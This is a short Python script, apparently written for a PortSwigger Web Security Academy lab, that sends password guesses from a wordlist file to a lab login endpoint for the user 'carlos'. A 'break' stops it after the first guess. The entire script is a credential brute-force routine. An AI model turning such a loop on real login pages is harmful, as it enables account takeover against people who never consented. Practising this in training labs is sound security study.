import requests

url = "https://0a2b002d044eb20680a8bcaa00c10064.web-security-academy.net/login"

username = "carlos"

with open("passwords.txt", "r") as f:
    for line in f:
        data = {
            "username" : username,
            "password" : line.strip()
        }
        print(data)
        response = requests.post(url, json=data)
        print(response.content)
        break
